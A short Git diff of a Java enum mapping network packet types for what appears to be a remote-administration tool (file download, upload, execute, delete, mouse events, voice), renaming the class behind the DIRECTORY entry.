@@ -17,7 +17,7 @@ public enum PacketType {
 	DOWNLOAD(10, DownloadFilePacket.class),
 	UPLOAD(11, UploadFilePacket.class),
 	EXECUTE(12, ExecuteFilePacket.class),
-	DIRECTORY(13, CreateDirectoryPacket.class),
+	DIRECTORY(13, NewDirectoryPacket.class),
 	DELETE(14, DeleteFilePacket.class),
 	MOUSE_EVENT(15, MouseEventPacket.class),
 	VOICE(16, VoicePacket.class),
